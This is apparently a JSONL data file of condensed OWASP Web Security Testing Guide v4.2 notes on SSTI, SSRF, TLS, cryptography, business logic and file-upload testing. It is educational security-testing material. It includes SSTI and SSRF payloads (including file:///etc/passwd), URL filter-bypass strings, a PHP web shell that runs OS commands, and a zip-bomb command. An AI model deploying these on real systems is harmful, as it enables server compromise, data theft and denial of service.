{"id": "WSTGv4_2-00134", "source": "wstg-v4.2_knowledge.json", "start_item": 2294, "end_item": 2309, "text": "ive template expression test strings/payloads list is recommended for SSTI testing.\nThe process of testing for Server-Side Template Injection (SSTI) involves constructing requests that reveal server responses, such as error messages or blank outputs.\nAn example of an SSTI payload is `personal_greeting=username<tag>`, which resulted in a blank server response: `Hello`.\nTo break out of a template statement, you can use payloads such as `personal_greeting=username}}<tag>` leading to server responses that include injected HTML tags.\nIdentifying the templating engine is crucial and can be done by supplying various template expressions to see how the server responds.\nTools like Tplmap and the Backslash Powered Scanner Burp Suite extension can automate the identification of SSTI vulnerabilities.\nWhen building an RCE exploit, important information is found in template documentation including syntax, security considerations, built-in methods, and available extensions/plugins.\nInvestigating the `self` object and its properties can reveal security vulnerabilities like privilege escalation or information leakage regarding application secrets.\nTplmap is a Burp Suite extension specifically designed for Server-Side Template Injection (SSTI) testing.\nThe page contains code related to template expression test strings and payloads.\nReferences include works by James Kettle and others related to SSTI and its exploitation.\nSSRF (Server-side Request Forgery) can lead to access to restricted actions, internal services, or files within an organization.\nPotential consequences of SSRF attacks include Remote Code Execution (RCE).\nTest objectives for SSRF include identifying injection points, testing their exploitability, and assessing vulnerability severity.\nCommon tests for SSRF involve attempting local and remote file inclusion.\nTrust relationships often lead to direct interactions between application servers and internal backend systems.\nInternal systems are often less secure and may contain sensitive data or functionality.\nExample request to test SSRF: `GET https://example.com/page?page=about.php`."}
{"id": "WSTGv4_2-00135", "source": "wstg-v4.2_knowledge.json", "start_item": 2310, "end_item": 2326, "text": "lead to direct interactions between application servers and internal backend systems.\nInternal systems are often less secure and may contain sensitive data or functionality.\nExample request to test SSRF: `GET https://example.com/page?page=about.php`.\nPayloads to test SSRF include requests that load contents from malicious sites or access restricted local endpoints.\nSSRF (Server-Side Request Forgery) vulnerabilities exploit trust relationships where local requests are treated differently from external requests.\nExample payload for SSRF exploitation: `GET https://example.com/page?page=file:///etc/passwd`\nSSRF can manifest in POST requests in a blind manner, where the effects may not be immediately visible to end-users or testers.\nPDF generators may be vulnerable to SSRF when they convert uploaded files to PDF format, allowing injection of tags like `<iframe>`, `<img>`, `<base>`, or `<script>`, potentially accessing internal files.\nCommon filter bypass techniques for localhost blocking include using decimal or octal notation, IP shortening, string obfuscation, and custom domain registration to resolve to 127.0.0.1.\nCircumvent filters with:\n- Using the `@` character in URLs: `https://expected-domain@attacker-domain`\n- URL fragmentation with `#`: `https://attacker-domain#expected-domain`\n- URL encoding and combinations of various techniques to obfuscate the input.\nFor prevention, allow lists of specific IPs and URLs are recommended to mitigate SSRF vulnerabilities.\nReferences related to SSRF (Server Side Request Forgery) vulnerabilities.\nCode referencing 'swisskyrepo: SSRF Payloads'.\nVarious resources such as blogs and cheatsheets for deeper understanding of SSRF.\nMention of specific organizations and platforms that provide information on SSRF like OWASP, Portswigger, Bugcrowd, and Hackerone.\nSection 4.8 focuses on Testing for Error Handling in web security.\n4.8.1 discusses Testing for Improper Error Handling, which is crucial for ensuring that applications do not disclose sensitive information through their error messages."}
{"id": "WSTGv4_2-00136", "source": "wstg-v4.2_knowledge.json", "start_item": 2327, "end_item": 2340, "text": "and Hackerone.\nSection 4.8 focuses on Testing for Error Handling in web security.\n4.8.1 discusses Testing for Improper Error Handling, which is crucial for ensuring that applications do not disclose sensitive information through their error messages.\n4.8.2 highlights Testing for Stack Traces, emphasizing the importance of preventing such traces from being exposed to users as they can reveal application structure and vulnerabilities.\nTesting for improper error handling is crucial as applications generate errors for various reasons and developers may overlook their handling.\nImproper error handling leads to security risks such as exposing internal APIs, service mappings, and application versions to attackers.\nError outputs can reveal sensitive information, allowing for potential attacks like DoS or unauthorized access due to control bypasses.\nThe objectives of testing for improper error handling include identifying existing error outputs and analyzing the varying responses returned by the application.\nUnexpected inputs can trigger errors that reveal internal workings of the application unless developers have disabled such error reporting.\nWeb servers play a key role in web applications, handling and parsing HTTP requests, with common servers including NGINX, Apache, and IIS.\nKnown error messages from web servers can be researched online or assessed through documentation and local server setups.\nTo trigger error messages, testers should search for non-existent files/folders and test existing directories for server responses.\nBreaking the HTTP RFC can expose server errors, revealing more information about the server.\nApplications are prone to exposure of error messages like stack traces and memory dumps due to custom builds.\nTesting should focus on input validation by analyzing expected input types such as strings, integers, JSON, XML, etc.\nFuzzing is a testing method that injects various inputs, but handpicking inputs can yield more efficient results.\nFuzzing should include tests with extreme values and unexpected characters to break parsers and discover vulnerabilities."}
{"id": "WSTGv4_2-00137", "source": "wstg-v4.2_knowledge.json", "start_item": 2341, "end_item": 2359, "text": "SON, XML, etc.\nFuzzing is a testing method that injects various inputs, but handpicking inputs can yield more efficient results.\nFuzzing should include tests with extreme values and unexpected characters to break parsers and discover vulnerabilities.\nUnderstanding the service generating the error message can help refine testing approaches and identify specific weaknesses in microservices.\nError messages can inadvertently reveal information that helps testers understand service mappings and APIs.\nTesters should be aware of how errors are communicated, particularly errors returned as successful responses.\nTesting for Weak Cryptography overview\nMethods of testing for Weak Transport Layer Security\nApproaches to testing Padding Oracle vulnerabilities\nIdentifying Sensitive Information sent via Unencrypted Channels\nTechniques for Testing Weak Encryption\nTesting for Weak Transport Layer Security is crucial to ensure safe data transmission between client and server.\nTLS (Transport Layer Security) is the protocol recommended for encrypting data, replacing the older SSL (Secure Socket Layer) protocol.\nTLS provides server authentication through the use of trusted digital certificates.\nRegular testing is necessary as cryptographic weaknesses in SSL/TLS protocols and ciphers have been discovered over time.\nKey test objectives include validating service configuration, reviewing the digital certificate’s cryptographic strength, and ensuring proper implementation of TLS.\nCommon vulnerabilities in TLS protocols include SSLv2 (DROWN), SSLv3 (POODLE), and weak ciphers such as RC4 (NOMORE) and Anonymous ciphers.\nTesting involves evaluating server configurations against known vulnerabilities and weaknesses.\nThe Mozilla Server Side TLS Guide is a resource for recommended protocols and ciphers for secure implementations.\nDigital certificates require a key strength of at least 2048 bits.\nThe signature algorithm for digital certificates should be at least SHA-256; avoid using MD5 and SHA-1.\nCertificates must be within a defined validity period and cannot have a maximum lifespan of more than 398 days for those issued after 1st September 2020."}
{"id": "WSTGv4_2-00138", "source": "wstg-v4.2_knowledge.json", "start_item": 2360, "end_item": 2379, "text": "nature algorithm for digital certificates should be at least SHA-256; avoid using MD5 and SHA-1.\nCertificates must be within a defined validity period and cannot have a maximum lifespan of more than 398 days for those issued after 1st September 2020.\nCertificates should be signed by a trusted certificate authority (CA) for the appropriate application context.\nAccess must be made through the correct hostname, with Subject Alternate Names (SAN) matching the hostname; Common Name (CN) is ignored by modern browsers.\nCertificates could expose internal system information, which may be leveraged for social engineering.\nImplementation vulnerabilities in TLS have included Debian OpenSSL Predictable Random Number Generator, OpenSSL Insecure Renegotiation, and Heartbleed, among others.\nApplications must securely configure TLS to send sensitive data over encrypted channels, utilize HTTP Strict-Transport-Security headers, and set the Secure flag on cookies.\nMixed active content poses a security risk by allowing attacks via unencrypted resources on an HTTPS page.\nContent loaded over insecure connections can leak information and allow attacks.\nModern browsers block active content from insecure sources into secure pages.\nRedirect users from HTTP to HTTPS using a 301 Moved Permanently redirect.\nUse the Strict-Transport-Security header to enforce HTTPS.\nAdd sites to the preload list to protect against initial request interception.\nScanning tools to identify weaknesses in SSL/TLS configurations include Nmap, OWASP O-Saft, sslscan, sslyze, SSL Labs, and testssl.sh.\nManual testing can be done using command-line tools like openssl s_client or gnutls-cli.\nModern browsers can help check protocols and ciphers being used during SSL/TLS connections.\nDefinition of a padding oracle and its security implications.\nPadding oracles can lead to decryption of data and privilege escalation.\nBlock sizes for encryption (8 and 16 bytes) and need for data padding.\nDescription of PKCS#7 padding scheme.\nExamples of errors indicating an oracle presence, including certain exceptions in programming languages.\nBit-flipping attacks in CBC (Cipher Block Chaining) mode."}
{"id": "WSTGv4_2-00139", "source": "wstg-v4.2_knowledge.json", "start_item": 2380, "end_item": 2395, "text": "ption (8 and 16 bytes) and need for data padding.\nDescription of PKCS#7 padding scheme.\nExamples of errors indicating an oracle presence, including certain exceptions in programming languages.\nBit-flipping attacks in CBC (Cipher Block Chaining) mode.\nPadding oracle attacks can reveal internal state information to attackers.\nTesting objectives for identifying and analyzing padding vulnerabilities in encrypted messages.\nA block cipher is used with Base64 decoding, resulting in ciphertext that is a multiple of common block sizes like 8 or 16 bytes.\nDifferent sessions or manipulation of session state can produce ciphertexts that share a common divisor in their lengths.\nThe presence of an initialization vector (IV) during encryption is key for understanding encryption mechanisms.\nDecryption tests must lead to observable states such as results being correct, garbled, or leading to padding errors.\nPadding oracle attacks exploit the different responses received during decryption attempts, indicating a potential vulnerability in the application.\nExamples of exceptions for padding issues include 'System.Security.Cryptography.CryptographicException: Padding is invalid...' in ASP.NET and 'javax.crypto.BadPaddingException' in Java.\nSecure implementations should only respond with 'ok' or 'failed' without exposing internal error states or side channels.\nGray-box testing involves checking encrypted data handling and ensuring integrity through secure mechanisms like HMAC or authenticated cipher operation modes.\nSensitive data must be protected during transmission over networks.\nData transmitted over HTTPS or other encryption methods should not have vulnerabilities.\nSensitive data types include authentication information, legal protected information, and organizational policy data.\nSecurity risks arise when sensitive data is transmitted via unencrypted channels like HTTP.\nExamples of Personal Identifying Information (PII) include social security numbers, bank account numbers, and healthcare information.\nTest objectives should focus on identifying sensitive information and assessing the privacy/security of communication channels."}
{"id": "WSTGv4_2-00140", "source": "wstg-v4.2_knowledge.json", "start_item": 2396, "end_item": 2410, "text": " Personal Identifying Information (PII) include social security numbers, bank account numbers, and healthcare information.\nTest objectives should focus on identifying sensitive information and assessing the privacy/security of communication channels.\nTesting methods include checking transmission over HTTP versus HTTPS and reviewing the use of strong encryption ciphers.\nThe use of Basic Authentication over HTTP can expose user credentials as they are only encoded and not encrypted.\nExample of using curl to test for Basic Authentication issues with a URL that requires authorization.\nForm-based authentication can also transmit user credentials over HTTP without encryption, which can be inspected using an interception proxy.\nIt's critical to ensure that session ID cookies are transmitted over secure channels to prevent interception.\nCookies must have the secure flag set; if not, they may be transmitted unencrypted over HTTP.\nThe page contains HTTP headers including Referer and Cookie information.\nAn example is provided for testing for password sensitive information in source code or logs.\nMethods to search for sensitive information using grep are described, emphasizing a regex pattern to find hardcoded credentials.\nThere are additional commands for checking personal identifiable information (PII) formats in logs or source code.\nA list of tools useful for web security testing is provided, including curl, grep, Identity Finder, Wireshark, and TCPDUMP.\nKey focus is on identifying security vulnerabilities related to sensitive data exposure.\nIncorrect uses of encryption algorithms can lead to sensitive data exposure, key leakage, broken authentication, insecure sessions, and spoofing attacks.\nWeak encryption or hash algorithms to avoid include MD5, RC4, DES, Blowfish, and SHA1.\nFor secure asymmetric encryption, Elliptic Curve Cryptography (ECC) is preferred, with RSA as an alternative if ECC cannot be used. RSA should have a minimum key size of 2048 bits for security."}
{"id": "WSTGv4_2-00141", "source": "wstg-v4.2_knowledge.json", "start_item": 2411, "end_item": 2427, "text": "thms to avoid include MD5, RC4, DES, Blowfish, and SHA1.\nFor secure asymmetric encryption, Elliptic Curve Cryptography (ECC) is preferred, with RSA as an alternative if ECC cannot be used. RSA should have a minimum key size of 2048 bits for security.\nAES (Advanced Encryption Standard) should use a random and unpredictable Initialization Vector (IV), and `java.security.SecureRandom` should be used instead of `java.util.Random` in Java for cryptographic purposes.\nFor password hashing, recommended methods include PBKDF2, Scrypt, and Bcrypt, with PBKDF2 requiring a minimum iteration count of over 10,000 as per NIST guidelines.\nWeak hash/encryption algorithms like MD5 and RC4 must not be used, and for hashing with PBKDF2, MD5 is strictly forbidden.\nFor Java implementations, review parameters of encryption implementations.\nUse `SecretKeyFactory` and `SecretKeySpec` for creating secret keys.\nFor RSA encryption, preferred padding modes are OAEP with SHA-1 and SHA-256, avoiding ECB.\nEnsure a different IV is used for every encryption operation.\nImplementations of `IvParameterSpec` should use randomly generated IVs.\nUsing weak hash algorithms like MD5 or CRC is discouraged, prefer stronger alternatives.\nFor digital signatures, avoid SHA1 and MD5 in favor of more secure options.\nUse PBKDF2 for password hashing, with iterations over 10,000 and a random salt.\nExample method definition given to show PBKDF2 implementation.\nUser related keywords for web security testing: name, root, su, sudo, admin, superuser, login, username, uid.\nKey related keywords: public key, AK, SK, secret key, private key, passwd, password, pwd, share key, shared key, cryto, base64.\nCommon sensitive keywords include: sysadmin, root, privilege, pass, key, code, master, admin, uname, session, token, Oauth, privatekey, shared secret.\nVulnerability scanners (Nessus, NMAP, OpenVAS) can identify weak encryption usage in protocols like SNMP, TLS, SSH, and SMTP.\nStatic code analysis tools (Klocwork, Fortify, Coverity, CheckMark) are recommended for reviewing specific CWE categories related to cryptography."}
{"id": "WSTGv4_2-00142", "source": "wstg-v4.2_knowledge.json", "start_item": 2428, "end_item": 2450, "text": " (Nessus, NMAP, OpenVAS) can identify weak encryption usage in protocols like SNMP, TLS, SSH, and SMTP.\nStatic code analysis tools (Klocwork, Fortify, Coverity, CheckMark) are recommended for reviewing specific CWE categories related to cryptography.\nImportant CWE categories include: CWE-261, CWE-323, CWE-326, CWE-327, CWE-328, CWE-329, CWE-347, CWE-354, CWE-547, CWE-780.\nReferences for further reading include NIST FIPS Standards, various cheat sheets for secure coding, and ISO standards for encryption algorithms.\nBusiness Logic Testing is a critical part of web security testing.\nIntroduction to Business Logic provides foundational knowledge on how business processes can be exploited.\nTest Business Logic Data Validation checks if inputs are appropriately validated.\nTest Ability to Forge Requests evaluates whether a user can manipulate requests to the server.\nTest Integrity Checks ensures the integrity of data and processes within the application.\nTest for Process Timing assesses how timing can affect the security of business processes.\nTest Number of Times a Function Can Be Used Limits examines restrictions on function usage to prevent abuse.\nTesting for the Circumvention of Work Flows aims to identify weaknesses in the workflow processes.\nTest Defenses Against Application Misuse checks the application's response to improper usage.\nTest Upload of Unexpected File Types verifies the system's handling of unsupported file types.\nTest Upload of Malicious Files aims to ensure that malicious files cannot be uploaded to the server.\nIntroduction to Business Logic in web applications\nTesting for business logic flaws requires unconventional thinking\nExample scenarios of testing steps out of intended order\nVulnerabilities may fail open or return server errors\nBusiness logic flaws cannot be detected by vulnerability scanners\nHard to detect but can be detrimental to applications\nClassification of business logic flaws is under-studied\nAutomation of business logic abuse cases is not possible; relies on manual testing skills\nConsideration of business rules and restrictions when testing\nCollaboration with clients and developers enhances understanding of application functionality"}
{"id": "WSTGv4_2-00143", "source": "wstg-v4.2_knowledge.json", "start_item": 2451, "end_item": 2467, "text": "died\nAutomation of business logic abuse cases is not possible; relies on manual testing skills\nConsideration of business rules and restrictions when testing\nCollaboration with clients and developers enhances understanding of application functionality\nChallenges of logic testing relate to the inability of automated tools to comprehend context\nExample of manipulating purchase parameters to exploit an e-commerce site.\nThe issue of resource holding/locking can lead to attackers purchasing items at a lower price.\nCountermeasures include implementing timeouts and price verification mechanisms.\nLogical vulnerabilities in business processes cannot be detected by typical testing tools.\nCommon tool types for identifying business logic issues include intercepting proxies and specific browser plugins.\nExamples of tools include OWASP Zed Attack Proxy, Burp Proxy, Tamper Data, and the Web Developer toolbar.\nHTTP Request Maker is a tool for tampering with HTTP requests during penetration testing.\nCookie Editors are essential for managing cookies in browser sessions.\nDiscussion on Business Logic Flaws and their implications for web security.\nReference to works and contributions from notable individuals in the field of web security, such as Jeremiah Grossman and Marco Morana.\nMention of methodologies like 'Automated Detection of Logic Vulnerabilities in Web Applications'.\nCWE-840 which categorizes Business Logic Errors, highlighting an important classification in security risks.\nReference to the book 'The Decision Model: A Business Logic Framework Linking Business and Technology', indicating a linkage between business logic and technology issues.\nThe application must validate both front-end and server-side data to prevent vulnerabilities to injections.\nBusiness logic data validation is distinct from Boundary Value Analysis (BVA) as it requires more complex logical checks that cannot be easily verified at entry points.\nUsing Social Security Numbers as an example, it is necessary to check not only the format but also contextual logic (such as death files or regional data)."}
{"id": "WSTGv4_2-00144", "source": "wstg-v4.2_knowledge.json", "start_item": 2468, "end_item": 2484, "text": "VA) as it requires more complex logical checks that cannot be easily verified at entry points.\nUsing Social Security Numbers as an example, it is necessary to check not only the format but also contextual logic (such as death files or regional data).\nBusiness data validation vulnerabilities are application-specific, focusing on logical data rather than just breaking workflow processes.\nBoth front-end and back-end must verify logical validity of the data being passed along.\nExample of an e-commerce site with complex business logic branching based on inventory status highlights the need for careful validation of transactions.\nCredit card systems may overlook real-time transaction updates, leading to potential exceedance of limits due to outdated data.\nDDo$ campaign exploited account transfer validation errors using small transfers to burden a target with transaction fees.\nIdentifying data injection points is crucial for web security testing.\nValidating that all checks occur on the back end helps to prevent bypassing security measures.\nThe application should handle logically invalid data appropriately during testing.\nA generic testing method involves reviewing documentation and using exploratory testing to find data entry points.\nUsing intercepting proxies is essential for observing HTTP requests and identifying potential injection points.\nTesting must ensure only logically valid data is accepted across all input and hand-off points within the application.\nCommon related test cases include input validation, account enumeration, session management schema bypassing, and exposed session variables.\nThere are specific tools recommended for testing such as OWASP Zed Attack Proxy (ZAP) and Burp Suite.\nOWASP Proactive Controls and Cheatsheet Series provide useful resources for validating inputs.\nForging requests allows attackers to bypass front-end applications and submit unauthorized data for backend processing.\nAttackers use intercepting proxies to send manipulated HTTP POST/GET requests to compromise an application's business logic.\nVulnerabilities related to request forgery are distinct from typical data validation issues, focusing on disrupting business workflows."}
{"id": "WSTGv4_2-00145", "source": "wstg-v4.2_knowledge.json", "start_item": 2485, "end_item": 2501, "text": "use intercepting proxies to send manipulated HTTP POST/GET requests to compromise an application's business logic.\nVulnerabilities related to request forgery are distinct from typical data validation issues, focusing on disrupting business workflows.\nApplications must implement logic checks to verify requests and prevent the acceptance of forged submissions.\nEaster eggs are unintended features that can be exploited through request forgery, providing attackers with hidden functionalities.\nExample of a forged request in an e-commerce setting: manipulating a hidden field to repeatedly apply a discount code.\nExample of a forged request in an online video game: exploiting hidden fields to gain unearned points or access restricted content.\nLogically valid data can be inserted to bypass business logic workflows.\nUse intercepting proxies to observe HTTP requests for guessable values.\nChanging guessable values may reveal unexpected visibility into applications.\nHidden options can be identified through HTTP requests and may allow access to undocumented features.\nRemediation involves designing applications to prevent manipulation of parameters and logic flows.\nTesting should include exposed session variables, CSRF, and account enumeration.\nUseful tools for testing web security include OWASP Zed Attack Proxy (ZAP) and Burp Suite.\nTest integrity checks are crucial for applications to validate user inputs, especially hidden fields.\nServer-side controls must ensure that data submitted by users adheres to business logic to prevent unauthorized access or data manipulation.\nApplications should not rely solely on non-editable fields or client-side validation as these can be manipulated by users with tools like proxies.\nIntegrity check vulnerabilities are application-specific and must be addressed within the context of business processes to ensure data integrity.\nExample 1 illustrates how a non-admin user can exploit hidden fields to change other users' passwords if proper checks are not in place.\nExample 2 demonstrates a scenario where an attacker could bypass access controls by submitting unauthorized project information through a proxy."}
{"id": "WSTGv4_2-00146", "source": "wstg-v4.2_knowledge.json", "start_item": 2502, "end_item": 2516, "text": "-admin user can exploit hidden fields to change other users' passwords if proper checks are not in place.\nExample 2 demonstrates a scenario where an attacker could bypass access controls by submitting unauthorized project information through a proxy.\nExample 3 warns of data integrity issues that can arise when applications are moved online without maintaining proper verification processes.\nLogging for auditing and troubleshooting is essential, but its validity can be compromised.\nTest objectives include reviewing system components for acceptable and unacceptable data types, along with access rights to modify or read data.\nThe code snippet demonstrates testing for data modifications that should be prohibited: ```code Attempt to insert, update, or delete data values used by each component that should not be allowed per the business logic workflow. ```\nSpecific Testing Method 1 involves using a proxy to capture HTTP traffic and look for hidden fields for interrogation.\nTesting Method 2 also utilizes a proxy to find areas in the application to insert information where it should not be allowed.\nTesting Method 3 focuses on identifying components like logs or databases that could be compromised and attempts to modify or read their information.\nRemediation requires strict access controls to modify and read data, ensuring data integrity, and proper logging.\nTools recommended for testing include OWASP Zed Attack Proxy (ZAP) and Burp Suite.\nTest for Process Timing (ID: WSTG-BUSL-04) assesses vulnerabilities related to the timing of processes within applications.\nAttackers can exploit timing discrepancies to infer system behavior or manipulate business process flows.\nManual misuse cases for timing vulnerabilities should be specific to the application/system.\nProcessing timing can leak information that can help users adjust their actions to 'game the system'.\nExample 1: Gambling slot machines may take longer to process transactions prior to a large payout, alerting users to increase bets.\nExample 2: In login processes, the delay in error messages based on valid vs. invalid usernames can provide insights to attackers regarding the validity of usernames."}
{"id": "WSTGv4_2-00147", "source": "wstg-v4.2_knowledge.json", "start_item": 2517, "end_item": 2533, "text": "r to process transactions prior to a large payout, alerting users to increase bets.\nExample 2: In login processes, the delay in error messages based on valid vs. invalid usernames can provide insights to attackers regarding the validity of usernames.\nFigure 4.10.4-1 illustrates the example control flow of a login form.\nExample 3 discusses the risks of transaction timeout in ticketing applications, highlighting that attackers can lock seats without purchasing, prompting some vendors to enforce a 5-minute transaction completion window.\nExample 4 examines pricing integrity in e-commerce, questioning if an attacker can exploit price changes by delaying the transaction after logging in.\nTest objectives include reviewing project documentation to identify time-sensitive functionality and developing misuse cases to uncover vulnerabilities.\nThe section indicates that there are systematic methods for testing designed to protect time-sensitive transactions.\nImage: img_page365_1.jpeg\nThe tester should identify processes dependent on time to prevent control bypasses.\nAutomating the requests that exploit timing dependencies is preferred for precision in security testing.\nManual testing can be used if automation is not possible, but it's less effective than automated tools.\nDrawing a process flow diagram is recommended for visualizing injection points and preparing requests.\nClose analysis is necessary to identify deviations in process execution versus expected business logic.\nTest cases should include checking cookie attributes and session timeouts to ensure secure handling of timing-related vulnerabilities.\nRemediation strategies include designing applications with timing considerations, adding processing delays, and implementing transaction time limits.\nTest Number of Times a Function Can Be Used Limits is part of the Web Security Testing Guide.\nApplications need to enforce limits to the number of times a function can be used to prevent exploitation.\nExamples include limiting discounts on eCommerce sites and downloads on subscription plans.\nAttackers can exploit loopholes in business logic to perform functions more times than allowed, leading to potential financial gain."}
{"id": "WSTGv4_2-00148", "source": "wstg-v4.2_knowledge.json", "start_item": 2534, "end_item": 2548, "text": " to prevent exploitation.\nExamples include limiting discounts on eCommerce sites and downloads on subscription plans.\nAttackers can exploit loopholes in business logic to perform functions more times than allowed, leading to potential financial gain.\nTesting objectives include identifying functions that have limits and assessing proper validation of those limits.\nExploratory testing is essential to uncover functions that should not be executed more than the designated number of times.\nDeveloping abuse or misuse cases is key to testing the efficacy of function limits.\nRemediation involves implementing hard controls to ensure that function limits are maintained, such as database-level restrictions and user session identification.\nWorkflow vulnerabilities allow attackers to misuse an application/system and circumvent the designed workﬂow.\nA workflow is defined as a sequence of connected steps in an organization or system without delays or gaps.\nBusiness logic should require users to complete specific steps in a designated order to avoid rollbacks of actions if not completed.\nCircumvention vulnerabilities are application/system specific and require careful manual testing.\nApplications should ensure that transactions/actions are performed in the correct order, with rollbacks occurring if not completed.\nExample 1 illustrates a loyalty points system vulnerability where users may exploit the system to gain points without completion of transactions.\nExample 2 shows a bulletin board system vulnerability where an initial post passes checks, but subsequent edits allow prohibited content.\nTesting for proper recording of points/credits in transactions after canceling or reducing final tender amount.\nMethod for testing content management systems by entering valid data and attempting to append or edit it to an invalid state.\nInclusion of invalid data types such as profanity or politically sensitive topics in testing an application's data validation.\nRelated test cases include directory traversal, bypassing authorization, session management, business logic validation, request forging, integrity checks, and file upload vulnerabilities."}
{"id": "WSTGv4_2-00149", "source": "wstg-v4.2_knowledge.json", "start_item": 2549, "end_item": 2564, "text": " sensitive topics in testing an application's data validation.\nRelated test cases include directory traversal, bypassing authorization, session management, business logic validation, request forging, integrity checks, and file upload vulnerabilities.\nRemediation involves ensuring that applications maintain workflow integrity and prevent attackers from skipping steps, with a focus on business logic abuse and misuse cases.\nReferences to OWASP and CWE for more information on abuse case scenarios and business logic errors.\nMisuse of application functionality can lead to the identification of weaknesses and vulnerabilities.\nTesting should be conducted to determine if application-layer defensive mechanisms are in place.\nLack of active defenses allows attackers to exploit vulnerabilities unnoticed by application owners.\nAn example sequence of actions demonstrates how a user can attempt to exploit an application.\nApplication should monitor for misuse and respond appropriately to potential attacks.\nResponse mechanisms might include disabling functionality, enabling additional authentication, adding time-delays, and recording user interactions.\nTesting objectives include generating notes on test results, reviewing functionality changes, and understanding defense measures.\nCommon localized defenses include rejecting specific input characters and temporarily locking out accounts after authentication failures.\nLocalized security controls are often insufficient against misuse such as forced browsing, multiple access control errors, and failing input validation.\nTesting actions that should trigger responses is crucial to identify the absence of active defenses in web applications.\nActive monitoring and responses to misuse behavior, such as unusual access patterns or automated tool usage, should be implemented in applications.\nReferences include OWASP AppSensor Project and various security publications addressing software assurance and misuse detection.\nTest Upload of Unexpected File Types is denoted as WSTG-BUSL-08.\nApplications must check uploaded files and only allow certain approved file types based on business logic."}
{"id": "WSTGv4_2-00150", "source": "wstg-v4.2_knowledge.json", "start_item": 2565, "end_item": 2578, "text": "ious security publications addressing software assurance and misuse detection.\nTest Upload of Unexpected File Types is denoted as WSTG-BUSL-08.\nApplications must check uploaded files and only allow certain approved file types based on business logic.\nAllowing unexpected file types can lead to various risks such as remote commands and exploitation of local vulnerabilities.\nIncorrect file format uploads may not be inherently malicious but can be detrimental to the saved data.\nHigh assurance file validation checks both the file extension and content, while low assurance validation may only check the file extension.\nExample scenario illustrates the risk of uploading harmful file types such as HTML or PHP files.\nKey testing objectives include reviewing project documentation, ensuring unwelcomed file types are rejected, and verifying security for file batch uploads.\nSpecific testing methods involve preparing a library of 'not-approved' files and verifying their rejection by the application.\nTesting checks should include client-side JavaScript validation, HTTP request Content-Type validation, file extension checks, and URL access to uploaded files.\nCheck for file path checking for uploaded files, as hackers may upload files to unintended paths using compression methods like ZIP.\nRelated test cases include testing for file extensions handling sensitive information and testing the upload of malicious files.\nRemediation strategies: applications should only accept acceptable files using methods like deny lists or allow lists of file extensions and validating the 'Content-Type' in headers.\nReferences include OWASP materials on unrestricted file upload and best practices for blocking malicious file uploads.\nTest Upload of Malicious Files is related to vulnerabilities in file upload functionalities of applications.\nValidating user-uploaded files is more complex than validating text-based inputs due to potential for disguised malicious content.\nBasic input validation using permitted file extensions is often inadequate against sophisticated attacks."}
{"id": "WSTGv4_2-00151", "source": "wstg-v4.2_knowledge.json", "start_item": 2579, "end_item": 2592, "text": "applications.\nValidating user-uploaded files is more complex than validating text-based inputs due to potential for disguised malicious content.\nBasic input validation using permitted file extensions is often inadequate against sophisticated attacks.\nMalicious files can include exploits or shellcode, and their definiton varies depending on the system in use (for example SQL vs NoSQL).\nSecurity measures like IPS/IDS, antivirus software, and scanning during upload can mitigate the risks of accepting malicious files.\nReal-world example: an application (e.g., blog or forum) allowing image uploads could be exploited by uploading executable code, leading to a complete server compromise.\nTest objectives include identifying file upload functionality, reviewing documentation on file types, and testing with malicious files to see if they are accepted.\nA web shell must be uploaded inside the webroot and the server configured to execute the code for an attack to be successful.\nProtecting uploaded shells can involve techniques such as random naming, password protection, and IP-based restrictions.\nA simple PHP shell can execute OS commands via a GET request if accessed from a specific IP address. Example code provided:\n```code <?php if ($_SERVER['REMOTE_HOST'] === 'FIXME') { // Set your IP address here if (isset ($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); echo '<pre> ' ; system($cmd); echo '</pre>' ; } } ?> ```\nBypassing client-side filters can be done using an intercepting proxy.\nServer-side filters may be bypassed by changing Content-Type headers, using uncommon file extensions, altering file name capitalizations, and other techniques.\nBadly configured servers may execute files with misleading extensions when uploaded. Example: `test.jpg/x.php` can execute as `x.php`.\nUploaded files should be scanned for malicious content and EICAR test files may be used for testing security measures.\nTools such as Metasploit Framework and Social Engineer Toolkit can be used to generate malicious files for testing.\nDirectory traversal can be exploited in applications that extract archives (Zip files) by uploading malicious Zip files with traversing paths."}
{"id": "WSTGv4_2-00152", "source": "wstg-v4.2_knowledge.json", "start_item": 2593, "end_item": 2607, "text": "ch as Metasploit Framework and Social Engineer Toolkit can be used to generate malicious files for testing.\nDirectory traversal can be exploited in applications that extract archives (Zip files) by uploading malicious Zip files with traversing paths.\nA Zip bomb is an archive file designed to cause a denial of service by exhausting system resources upon extraction.\nA simple Zip bomb can be created using the command: ```dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip```.\nXML files may have vulnerabilities like XML eXternal Entities (XXE) and can be targeted with denial of service attacks like the billion laughs attack.\nCSV files may allow for CSV injection attacks, and Office files may contain malicious macros or PowerShell code.\nList of PHP functions relevant to file handling: `move_uploaded_file()`, `readfile()`, `file_put_contents()`, `file()`, `parse_ini_file()`, `copy()`, `fopen()`, `include()`, `require()`\nRelated test cases include: - Test File Extensions Handling for Sensitive Information - Testing for XML Injection - Test Upload of Unexpected File Types\nRemediation measures for secure file uploads are complex and depend on file types and server processing. Refer to the File Upload Cheat Sheet for more information.\nTools mentioned include: Metasploit’s payload generation functionality and intercepting proxy.\nReferences include various OWASP documents related to file uploads and security threats.\nClient-side testing is critical in web security assessments.\nCommon tests include DOM-Based Cross Site Scripting, JavaScript Execution, HTML Injection, URL Redirects, CSS Injection, and Resource Manipulation.\nTesting for Cross Origin Resource Sharing and Cross Site Flashing are essential to understand the implications of security on user data.\nClickjacking is a technique used to trick users into clicking on something different than what the user perceives, emphasizing the importance of secure client-side interactions.\nWebSockets and Web Messaging are new communication protocols that also require specific security testing measures.\nBrowser Storage mechanisms should be tested to ensure sensitive data is not improperly exposed."}
